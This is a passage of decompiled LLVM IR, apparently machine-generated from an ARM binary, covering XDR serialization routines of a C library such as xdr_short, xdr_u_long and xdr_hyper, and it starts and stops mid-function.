.thread13:                                        ; preds = %dec_label_pc_181f8, %bb55
  %v0_18210 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18210, i32* %r0.global-to-local, align 4
  %v2_18218 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_18218, i32* %r4.global-to-local, align 4
  store i32 %v6_17fd4, i32* %r5.global-to-local, align 4
  ret i32 %v0_18210

; uselistorder directives
  uselistorder i32 %v1_1816c, { 1, 0 }
  uselistorder i32 %v0_18164, { 1, 0, 2 }
  uselistorder i32 %v1_18158, { 1, 2, 0 }
  uselistorder i32 %v2_18130, { 2, 0, 1 }
  uselistorder i32 %v2_18110, { 2, 0, 1 }
  uselistorder i32 %v3_180f4, { 2, 3, 0, 1 }
  uselistorder i32 %v3_180cc, { 2, 0, 1 }
  uselistorder i32 %v4_180a4, { 2, 0, 1 }
  uselistorder i32 %v2_18070, { 2, 1, 0 }
  uselistorder i32 %v3_18054, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 0, 3, 2, 4, 1, 5 }
  uselistorder i32* %stack_var_-48, { 0, 1, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 5, 3, 4, 6, 8, 7, 0, 1, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 6, 5, 8, 7, 13, 9, 10, 11, 12, 14, 1, 2, 15, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 65280, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_181f8, { 1, 0 }
  uselistorder label %dec_label_pc_181f4, { 2, 3, 0, 1 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_181b8, { 1, 0 }
  uselistorder label %dec_label_pc_18164, { 1, 0 }
  uselistorder label %dec_label_pc_18130, { 1, 0 }
}

define i32 @xdr_free(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_18228 = ptrtoint i32* %stack_var_-28 to i32
  store i32 2, i32* %stack_var_-28, align 4
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %v2_18228
}

define i32 @xdr_void() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @__GI_xdr_long() local_unnamed_addr {
entry:
  %v0_18254 = load i32, i32* @r0, align 4
  %v1_18254 = inttoptr i32 %v0_18254 to i32*
  %v2_18254 = load i32, i32* %v1_18254, align 4
  %v2_18258 = icmp eq i32 %v2_18254, 0
  br i1 %v2_18258, label %dec_label_pc_18260, label %dec_label_pc_18270

dec_label_pc_18260:                               ; preds = %entry
  %v1_18260 = add i32 %v0_18254, 4
  %v2_18260 = inttoptr i32 %v1_18260 to i32*
  %v3_18260 = load i32, i32* %v2_18260, align 4
  store i32 98924, i32* @lr, align 4
  %v1_18268 = add i32 %v3_18260, 4
  %v2_18268 = inttoptr i32 %v1_18268 to i32*
  %v3_18268 = load i32, i32* %v2_18268, align 4
  call void @__pseudo_branch(i32 %v3_18268)
  %v5_1826c = load i32, i32* @r0, align 4
  ret i32 %v5_1826c

dec_label_pc_18270:                               ; preds = %entry
  %v7_18270 = icmp eq i32 %v2_18254, 1
  br i1 %v7_18270, label %dec_label_pc_18278, label %dec_label_pc_18288

dec_label_pc_18278:                               ; preds = %dec_label_pc_18270
  %v1_18278 = add i32 %v0_18254, 4
  %v2_18278 = inttoptr i32 %v1_18278 to i32*
  %v3_18278 = load i32, i32* %v2_18278, align 4
  store i32 98948, i32* @lr, align 4
  %v1_18280 = inttoptr i32 %v3_18278 to i32*
  %v2_18280 = load i32, i32* %v1_18280, align 4
  call void @__pseudo_branch(i32 %v2_18280)
  %v5_18284 = load i32, i32* @r0, align 4
  ret i32 %v5_18284

dec_label_pc_18288:                               ; preds = %dec_label_pc_18270
  %v7_18288 = icmp eq i32 %v2_18254, 2
  %. = zext i1 %v7_18288 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v0_18254, { 1, 0, 2 }
}

define i32 @xdr_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_18298 = load i32, i32* @r4, align 4
  store i32 %v3_18298, i32* %stack_var_-12, align 4
  %v0_1829c = load i32, i32* %r0.global-to-local, align 4
  %v1_1829c = inttoptr i32 %v0_1829c to i32*
  %v2_1829c = load i32, i32* %v1_1829c, align 4
  store i32 %v2_1829c, i32* %r4.global-to-local, align 4
  %v7_182a4 = icmp eq i32 %v2_1829c, 1
  store i1 %v7_182a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v7_182a4, label %dec_label_pc_182f4, label %dec_label_pc_182b4

dec_label_pc_182b4:                               ; preds = %entry
  %v2_182a4 = icmp eq i32 %v2_1829c, 0
  br i1 %v2_182a4, label %dec_label_pc_182cc, label %dec_label_pc_182bc

dec_label_pc_182bc:                               ; preds = %dec_label_pc_182b4
  %v7_182bc = icmp eq i32 %v2_1829c, 2
  store i1 %v7_182bc, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v7_182bc, label %dec_label_pc_18320, label %dec_label_pc_1831c

dec_label_pc_182cc:                               ; preds = %dec_label_pc_182b4
  %v1_182cc = add i32 %arg2, 1
  %v2_182cc = inttoptr i32 %v1_182cc to i8*
  %v3_182cc = load i8, i8* %v2_182cc, align 1
  %v4_182cc = zext i8 %v3_182cc to i32
  %v1_182d0 = inttoptr i32 %arg2 to i8*
  %v2_182d0 = load i8, i8* %v1_182d0, align 1
  %v3_182d0 = zext i8 %v2_182d0 to i32
  %v3_182d4 = mul nuw i32 %v4_182cc, 16777216
  %v4_182d8 = sdiv i32 %v3_182d4, 65536
  %v5_182d8 = or i32 %v4_182d8, %v3_182d0
  store i32 %v5_182d8, i32* %r2.global-to-local, align 4
  store i8 %v2_182d0, i8* %stack_var_-16, align 1
  %v1_182e4 = add i32 %v0_1829c, 4
  %v2_182e4 = inttoptr i32 %v1_182e4 to i32*
  %v3_182e4 = load i32, i32* %v2_182e4, align 4
  %v1_182ec = add i32 %v3_182e4, 4
  %v2_182ec = inttoptr i32 %v1_182ec to i32*
  %v3_182ec = load i32, i32* %v2_182ec, align 4
  call void @__pseudo_branch(i32 %v3_182ec)
  br label %dec_label_pc_18320

dec_label_pc_182f4:                               ; preds = %entry
  %v1_182f4 = add i32 %v0_1829c, 4
  %v2_182f4 = inttoptr i32 %v1_182f4 to i32*
  %v3_182f4 = load i32, i32* %v2_182f4, align 4
  %v1_182fc = inttoptr i32 %v3_182f4 to i32*
  %v2_182fc = load i32, i32* %v1_182fc, align 4
  call void @__pseudo_branch(i32 %v2_182fc)
  %v0_18300 = load i32, i32* %r0.global-to-local, align 4
  %v2_18300 = icmp eq i32 %v0_18300, 0
  store i1 %v2_18300, i1* %cpsr_z.global-to-local, align 1
  %v0_18304 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18304, i32* %r0.global-to-local, align 4
  br i1 %v2_18300, label %dec_label_pc_1831c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_182f4
  %v3_18308 = load i8, i8* %stack_var_-16, align 1
  %v4_18308 = sext i8 %v3_18308 to i32
  store i32 %v4_18308, i32* %r2.global-to-local, align 4
  %v4_1830c = sdiv i32 %v4_18308, 256
  %v2_18310 = trunc i32 %v4_1830c to i8
  %v3_18310 = load i32, i32* %r5.global-to-local, align 4
  %v4_18310 = add i32 %v3_18310, 1
  %v5_18310 = inttoptr i32 %v4_18310 to i8*
  store i8 %v2_18310, i8* %v5_18310, align 1
  %v0_18314.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18314.pr.pr, label %dec_label_pc_1831c, label %.thread3

.thread3:                                         ; preds = %.thread2
  %v1_18314 = load i32, i32* %r2.global-to-local, align 4
  %v2_18314 = trunc i32 %v1_18314 to i8
  %v3_18314 = load i32, i32* %r5.global-to-local, align 4
  %v4_18314 = inttoptr i32 %v3_18314 to i8*
  store i8 %v2_18314, i8* %v4_18314, align 1
  %v0_18318.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18318.pr.pr.pr, label %dec_label_pc_1831c, label %dec_label_pc_18320

dec_label_pc_1831c:                               ; preds = %dec_label_pc_182f4, %.thread2, %.thread3, %dec_label_pc_182bc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18320

dec_label_pc_18320:                               ; preds = %dec_label_pc_182bc, %.thread3, %dec_label_pc_182cc, %dec_label_pc_1831c
  %v2_18324 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18324, i32* %r4.global-to-local, align 4
  %v11_18324 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_18324

; uselistorder directives
  uselistorder i32 %v2_1829c, { 0, 2, 1, 3 }
  uselistorder i8* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18320, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1831c, { 2, 1, 0, 3 }
}

define i32 @__GI_xdr_int() local_unnamed_addr {
entry:
  %v0_18328 = call i32 @__GI_xdr_long()
  ret i32 %v0_18328
}

define i32 @xdr_u_long() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1832c = load i32, i32* @r4, align 4
  store i32 %v3_1832c, i32* %stack_var_-12, align 4
  %v0_18330 = load i32, i32* @r0, align 4
  %v1_18330 = inttoptr i32 %v0_18330 to i32*
  %v2_18330 = load i32, i32* %v1_18330, align 4
  store i32 %v2_18330, i32* %r4.global-to-local, align 4
  %v7_18334 = icmp eq i32 %v2_18330, 1
  %v0_1833c = load i32, i32* @r1, align 4
  store i32 %v0_1833c, i32* %r5.global-to-local, align 4
  br i1 %v7_18334, label %dec_label_pc_18358, label %dec_label_pc_18344

dec_label_pc_18344:                               ; preds = %entry
  %v2_18334 = icmp eq i32 %v2_18330, 0
  br i1 %v2_18334, label %dec_label_pc_18380, label %dec_label_pc_18348

dec_label_pc_18348:                               ; preds = %dec_label_pc_18344
  %v7_18348 = icmp eq i32 %v2_18330, 2
  store i32 1, i32* @r0, align 4
  br i1 %v7_18348, label %dec_label_pc_18394, label %dec_label_pc_18390

dec_label_pc_18358:                               ; preds = %entry
  %v1_18358 = add i32 %v0_18330, 4
  %v2_18358 = inttoptr i32 %v1_18358 to i32*
  %v3_18358 = load i32, i32* %v2_18358, align 4
  store i32 99176, i32* @lr, align 4
  %v1_18364 = inttoptr i32 %v3_18358 to i32*
  %v2_18364 = load i32, i32* %v1_18364, align 4
  call void @__pseudo_branch(i32 %v2_18364)
  %v0_18368 = load i32, i32* @r0, align 4
  %v2_18368 = icmp eq i32 %v0_18368, 0
  br i1 %v2_18368, label %.thread3, label %bb

.thread3:                                         ; preds = %dec_label_pc_18358
  br label %dec_label_pc_18390

bb:                                               ; preds = %dec_label_pc_18358
  %v3_1836c = load i32, i32* %stack_var_-16, align 4
  %v0_18370 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18370, i32* @r0, align 4
  %v2_18374 = load i32, i32* %r5.global-to-local, align 4
  %v3_18374 = inttoptr i32 %v2_18374 to i32*
  store i32 %v3_1836c, i32* %v3_18374, align 4
  br label %dec_label_pc_18394

dec_label_pc_18380:                               ; preds = %dec_label_pc_18344
  %v1_18380 = add i32 %v0_18330, 4
  %v2_18380 = inttoptr i32 %v1_18380 to i32*
  %v3_18380 = load i32, i32* %v2_18380, align 4
  store i32 99212, i32* @lr, align 4
  %v1_18388 = add i32 %v3_18380, 4
  %v2_18388 = inttoptr i32 %v1_18388 to i32*
  %v3_18388 = load i32, i32* %v2_18388, align 4
  call void @__pseudo_branch(i32 %v3_18388)
  br label %dec_label_pc_18394

dec_label_pc_18390:                               ; preds = %.thread3, %dec_label_pc_18348
  store i32 0, i32* @r0, align 4
  br label %dec_label_pc_18394

dec_label_pc_18394:                               ; preds = %bb, %dec_label_pc_18348, %dec_label_pc_18380, %dec_label_pc_18390
  %v2_18398 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18398, i32* @r4, align 4
  %v11_18398 = load i32, i32* @r0, align 4
  ret i32 %v11_18398

; uselistorder directives
  uselistorder i32 %v2_18330, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18330, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18394, { 3, 2, 0, 1 }
}

define i32 @xdr_u_int(i32* %xdrs, i32* %ulp) local_unnamed_addr {
entry:
  %v0_1839c = call i32 @xdr_u_long()
  ret i32 %v0_1839c
}

define i32 @__GI_xdr_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_183a0 = load i32, i32* @r4, align 4
  store i32 %v3_183a0, i32* %stack_var_-20, align 4
  %v0_183a4 = load i32, i32* @r0, align 4
  %v1_183a4 = inttoptr i32 %v0_183a4 to i32*
  %v2_183a4 = load i32, i32* %v1_183a4, align 4
  store i32 %v2_183a4, i32* %r7.global-to-local, align 4
  %v2_183a8 = icmp eq i32 %v2_183a4, 0
  store i32 %v0_183a4, i32* %r5.global-to-local, align 4
  %v0_183b4 = load i32, i32* @r1, align 4
  store i32 %v0_183b4, i32* %r6.global-to-local, align 4
  br i1 %v2_183a8, label %dec_label_pc_183bc, label %dec_label_pc_18408

dec_label_pc_183bc:                               ; preds = %entry
  %v1_183bc = inttoptr i32 %v0_183b4 to i32*
  %v2_183bc = load i32, i32* %v1_183bc, align 4
  %v1_183c0 = add i32 %v0_183b4, 4
  %v2_183c0 = inttoptr i32 %v1_183c0 to i32*
  %v3_183c0 = load i32, i32* %v2_183c0, align 4
  store i32 %v2_183bc, i32* %stack_var_-28, align 4
  store i32 %v3_183c0, i32* %stack_var_-24, align 4
  %v1_183cc = add i32 %v0_183a4, 4
  %v2_183cc = inttoptr i32 %v1_183cc to i32*
  %v3_183cc = load i32, i32* %v2_183cc, align 4
  %v3_183d0 = ashr i32 %v3_183c0, 31
  store i32 %v3_183d0, i32* %r4.global-to-local, align 4
  %v1_183d8 = add i32 %v3_183cc, 4
  %v2_183d8 = inttoptr i32 %v1_183d8 to i32*
  %v3_183d8 = load i32, i32* %v2_183d8, align 4
  call void @__pseudo_branch(i32 %v3_183d8)
  %v0_183dc = load i32, i32* @r0, align 4
  %v2_183dc = icmp eq i32 %v0_183dc, 0
  br i1 %v2_183dc, label %bb, label %dec_label_pc_183e8

bb:                                               ; preds = %dec_label_pc_183bc
  %v1_183e0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_183e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18480

dec_label_pc_183e8:                               ; preds = %dec_label_pc_183bc
  %v0_183e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_183e8, i32* %r0.global-to-local, align 4
  %v1_183ec = add i32 %v0_183e8, 4
  %v2_183ec = inttoptr i32 %v1_183ec to i32*
  %v3_183ec = load i32, i32* %v2_183ec, align 4
  %v1_183f8 = add i32 %v3_183ec, 4
  %v2_183f8 = inttoptr i32 %v1_183f8 to i32*
  %v3_183f8 = load i32, i32* %v2_183f8, align 4
  call void @__pseudo_branch(i32 %v3_183f8)
  %v0_183fc = load i32, i32* %r0.global-to-local, align 4
  %v2_183fc = icmp eq i32 %v0_183fc, 0
  br i1 %v2_183fc, label %dec_label_pc_18480, label %bb10

bb10:                                             ; preds = %dec_label_pc_183e8
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18480

dec_label_pc_18408:                               ; preds = %entry
  %v7_18408 = icmp eq i32 %v2_183a4, 1
  br i1 %v7_18408, label %dec_label_pc_18410, label %dec_label_pc_1846c

dec_label_pc_18410:                               ; preds = %dec_label_pc_18408
  %v1_18410 = add i32 %v0_183a4, 4
  %v2_18410 = inttoptr i32 %v1_18410 to i32*
  %v3_18410 = load i32, i32* %v2_18410, align 4
  %v1_1841c = inttoptr i32 %v3_18410 to i32*
  %v2_1841c = load i32, i32* %v1_1841c, align 4
  call void @__pseudo_branch(i32 %v2_1841c)
  %v0_18420 = load i32, i32* @r0, align 4
  %v2_18420 = icmp eq i32 %v0_18420, 0
  br i1 %v2_18420, label %dec_label_pc_1847c, label %dec_label_pc_18428

dec_label_pc_18428:                               ; preds = %dec_label_pc_18410
  %v0_18428 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18428, i32* %r0.global-to-local, align 4
  %v1_1842c = add i32 %v0_18428, 4
  %v2_1842c = inttoptr i32 %v1_1842c to i32*
  %v3_1842c = load i32, i32* %v2_1842c, align 4
  %v1_18438 = inttoptr i32 %v3_1842c to i32*
  %v2_18438 = load i32, i32* %v1_18438, align 4
  call void @__pseudo_branch(i32 %v2_18438)
  %v0_1843c = load i32, i32* %r0.global-to-local, align 4
  %v2_1843c = icmp eq i32 %v0_1843c, 0
  br i1 %v2_1843c, label %dec_label_pc_1847c, label %dec_label_pc_18444

dec_label_pc_18444:                               ; preds = %dec_label_pc_18428
  %v3_18444 = load i32, i32* %stack_var_-24, align 4
  %v1_18448 = load i32, i32* %r6.global-to-local, align 4
  %v2_18448 = add i32 %v1_18448, 4
  %v3_18448 = inttoptr i32 %v2_18448 to i32*
  store i32 %v3_18444, i32* %v3_18448, align 4
  %v1_18450 = load i32, i32* %r6.global-to-local, align 4
  %v2_18450 = inttoptr i32 %v1_18450 to i32*
  store i32 0, i32* %v2_18450, align 4
  %v2_18454 = load i32, i32* %stack_var_-28, align 4
  %v0_18458 = load i32, i32* %r6.global-to-local, align 4
  %v1_18458 = inttoptr i32 %v0_18458 to i32*
  %v2_18458 = load i32, i32* %v1_18458, align 4
  %v3_18458 = add i32 %v0_18458, 4
  %v4_18458 = inttoptr i32 %v3_18458 to i32*
  %v5_18458 = load i32, i32* %v4_18458, align 4
  store i32 %v5_18458, i32* %r4.global-to-local, align 4
  %v0_1845c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1845c, i32* %r0.global-to-local, align 4
  %v2_18460 = or i32 %v2_18458, %v2_18454
  store i32 %v2_18460, i32* %v1_18458, align 4
  %v5_18464 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18464, i32* %v4_18458, align 4
  %v17_18484.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18480

dec_label_pc_1846c:                               ; preds = %dec_label_pc_18408
  %v7_1846c = icmp eq i32 %v2_183a4, 2
  br i1 %v7_1846c, label %.thread1, label %bb11

bb11:                                             ; preds = %dec_label_pc_1846c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18480

.thread1:                                         ; preds = %dec_label_pc_1846c
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18480

dec_label_pc_1847c:                               ; preds = %dec_label_pc_18428, %dec_label_pc_18410
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18480

dec_label_pc_18480:                               ; preds = %bb, %bb11, %.thread1, %bb10, %dec_label_pc_183e8, %dec_label_pc_18444, %dec_label_pc_1847c
  %v17_18484 = phi i32 [ 1, %.thread1 ], [ 0, %bb11 ], [ 1, %bb10 ], [ 0, %dec_label_pc_183e8 ], [ %v1_183e0, %bb ], [ %v17_18484.pre, %dec_label_pc_18444 ], [ 0, %dec_label_pc_1847c ]
  %v2_18484 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_18484, i32* %r4.global-to-local, align 4
  ret i32 %v17_18484

; uselistorder directives
  uselistorder i32 %v0_183a4, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 8 }
  uselistorder label %dec_label_pc_18480, { 6, 2, 1, 5, 3, 4, 0 }
}

define i32 @xdr_u_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18488 = load i32, i32* @r4, align 4
  store i32 %v3_18488, i32* %stack_var_-16, align 4
  %v0_1848c = load i32, i32* @r0, align 4
  %v1_1848c = inttoptr i32 %v0_1848c to i32*
  %v2_1848c = load i32, i32* %v1_1848c, align 4
  store i32 %v2_1848c, i32* %r6.global-to-local, align 4
  %v2_18490 = icmp eq i32 %v2_1848c, 0
  store i32 %v0_1848c, i32* %r4.global-to-local, align 4
  %v0_1849c = load i32, i32* @r1, align 4
  store i32 %v0_1849c, i32* %r5.global-to-local, align 4
  br i1 %v2_18490, label %dec_label_pc_184a4, label %dec_label_pc_184f0

dec_label_pc_184a4:                               ; preds = %entry
  %v1_184a4 = inttoptr i32 %v0_1849c to i32*
  %v2_184a4 = load i32, i32* %v1_184a4, align 4
  %v1_184a8 = add i32 %v0_1849c, 4
  %v2_184a8 = inttoptr i32 %v1_184a8 to i32*
  %v3_184a8 = load i32, i32* %v2_184a8, align 4
  store i32 %v2_184a4, i32* %stack_var_-24, align 4
  store i32 %v3_184a8, i32* %stack_var_-20, align 4
  %v1_184b8 = add i32 %v0_1848c, 4
  %v2_184b8 = inttoptr i32 %v1_184b8 to i32*
  %v3_184b8 = load i32, i32* %v2_184b8, align 4
  %v1_184c0 = add i32 %v3_184b8, 4
  %v2_184c0 = inttoptr i32 %v1_184c0 to i32*
  %v3_184c0 = load i32, i32* %v2_184c0, align 4
  call void @__pseudo_branch(i32 %v3_184c0)
  %v0_184c4 = load i32, i32* @r0, align 4
  %v2_184c4 = icmp eq i32 %v0_184c4, 0
  br i1 %v2_184c4, label %bb, label %dec_label_pc_184d0

bb:                                               ; preds = %dec_label_pc_184a4
  %v1_184c8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v1_184c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18568

dec_label_pc_184d0:                               ; preds = %dec_label_pc_184a4
  %v0_184d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_184d0, i32* %r0.global-to-local, align 4
  %v1_184d4 = add i32 %v0_184d0, 4
  %v2_184d4 = inttoptr i32 %v1_184d4 to i32*
  %v3_184d4 = load i32, i32* %v2_184d4, align 4
  %v1_184e0 = add i32 %v3_184d4, 4
  %v2_184e0 = inttoptr i32 %v1_184e0 to i32*
  %v3_184e0 = load i32, i32* %v2_184e0, align 4
  call void @__pseudo_branch(i32 %v3_184e0)
  %v0_184e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_184e4 = icmp eq i32 %v0_184e4, 0
  br i1 %v2_184e4, label %dec_label_pc_18568, label %bb9

bb9:                                              ; preds = %dec_label_pc_184d0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18568

dec_label_pc_184f0:                               ; preds = %entry
  %v7_184f0 = icmp eq i32 %v2_1848c, 1
  br i1 %v7_184f0, label %dec_label_pc_184f8, label %dec_label_pc_18554

dec_label_pc_184f8:                               ; preds = %dec_label_pc_184f0
  %v1_184f8 = add i32 %v0_1848c, 4
  %v2_184f8 = inttoptr i32 %v1_184f8 to i32*
  %v3_184f8 = load i32, i32* %v2_184f8, align 4
  %v1_18504 = inttoptr i32 %v3_184f8 to i32*
  %v2_18504 = load i32, i32* %v1_18504, align 4
  call void @__pseudo_branch(i32 %v2_18504)
  %v0_18508 = load i32, i32* @r0, align 4
  %v2_18508 = icmp eq i32 %v0_18508, 0
  br i1 %v2_18508, label %dec_label_pc_18564, label %dec_label_pc_18510

dec_label_pc_18510:                               ; preds = %dec_label_pc_184f8
  %v0_18510 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18510, i32* %r0.global-to-local, align 4
  %v1_18514 = add i32 %v0_18510, 4
  %v2_18514 = inttoptr i32 %v1_18514 to i32*
  %v3_18514 = load i32, i32* %v2_18514, align 4
  %v1_18520 = inttoptr i32 %v3_18514 to i32*
  %v2_18520 = load i32, i32* %v1_18520, align 4
  call void @__pseudo_branch(i32 %v2_18520)
  %v0_18524 = load i32, i32* %r0.global-to-local, align 4
  %v2_18524 = icmp eq i32 %v0_18524, 0
  br i1 %v2_18524, label %dec_label_pc_18564, label %dec_label_pc_1852c

dec_label_pc_1852c:                               ; preds = %dec_label_pc_18510
  %v3_1852c = load i32, i32* %stack_var_-20, align 4
  %v1_18530 = load i32, i32* %r5.global-to-local, align 4
  %v2_18530 = add i32 %v1_18530, 4
  %v3_18530 = inttoptr i32 %v2_18530 to i32*
  store i32 %v3_1852c, i32* %v3_18530, align 4
  %v1_18538 = load i32, i32* %r5.global-to-local, align 4
  %v2_18538 = inttoptr i32 %v1_18538 to i32*
  store i32 0, i32* %v2_18538, align 4
  %v2_1853c = load i32, i32* %stack_var_-24, align 4
  %v0_18540 = load i32, i32* %r5.global-to-local, align 4
  %v1_18540 = inttoptr i32 %v0_18540 to i32*
  %v2_18540 = load i32, i32* %v1_18540, align 4
  %v3_18540 = add i32 %v0_18540, 4
  %v4_18540 = inttoptr i32 %v3_18540 to i32*
  %v5_18540 = load i32, i32* %v4_18540, align 4
  store i32 %v5_18540, i32* %r4.global-to-local, align 4
  %v0_18544 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18544, i32* %r0.global-to-local, align 4
  %v2_18548 = or i32 %v2_18540, %v2_1853c
  store i32 %v2_18548, i32* %v1_18540, align 4
  %v5_1854c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1854c, i32* %v4_18540, align 4
  %v14_1856c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18568

dec_label_pc_18554:                               ; preds = %dec_label_pc_184f0
  %v7_18554 = icmp eq i32 %v2_1848c, 2
  br i1 %v7_18554, label %.thread1, label %bb10

bb10:                                             ; preds = %dec_label_pc_18554
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18568

.thread1:                                         ; preds = %dec_label_pc_18554
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18568

dec_label_pc_18564:                               ; preds = %dec_label_pc_18510, %dec_label_pc_184f8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18568

dec_label_pc_18568:                               ; preds = %bb, %bb10, %.thread1, %bb9, %dec_label_pc_184d0, %dec_label_pc_1852c, %dec_label_pc_18564
  %v14_1856c = phi i32 [ 1, %.thread1 ], [ 0, %bb10 ], [ 1, %bb9 ], [ 0, %dec_label_pc_184d0 ], [ %v1_184c8, %bb ], [ %v14_1856c.pre, %dec_label_pc_1852c ], [ 0, %dec_label_pc_18564 ]
  %v2_1856c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1856c, i32* %r4.global-to-local, align 4
  ret i32 %v14_1856c

; uselistorder directives
  uselistorder i32 %v0_1849c, { 1, 0, 2 }
  uselistorder i32 %v0_1848c, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 8 }
  uselistorder label %dec_label_pc_18568, { 6, 2, 1, 5, 3, 4, 0 }
}

define i32 @xdr_longlong_t() local_unnamed_addr {
entry:
  %v0_18570 = call i32 @__GI_xdr_hyper()
  ret i32 %v0_18570
}

define i32 @xdr_u_longlong_t(i32* %xdrs, i64* %ullp) local_unnamed_addr {
entry:
  %v0_18574 = call i32 @xdr_u_hyper()
  ret i32 %v0_18574
}

define i32 @__GI_xdr_u_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_18578 = load i32, i32* @r4, align 4
  store i32 %v3_18578, i32* %stack_var_-12, align 4
  %v0_1857c = load i32, i32* %r0.global-to-local, align 4
  %v1_1857c = inttoptr i32 %v0_1857c to i32*
  %v2_1857c = load i32, i32* %v1_1857c, align 4
  store i32 %v2_1857c, i32* %r4.global-to-local, align 4
  %v7_18584 = icmp eq i32 %v2_1857c, 1
  store i1 %v7_18584, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v7_18584, label %dec_label_pc_185d0, label %dec_label_pc_18594

dec_label_pc_18594:                               ; preds = %entry
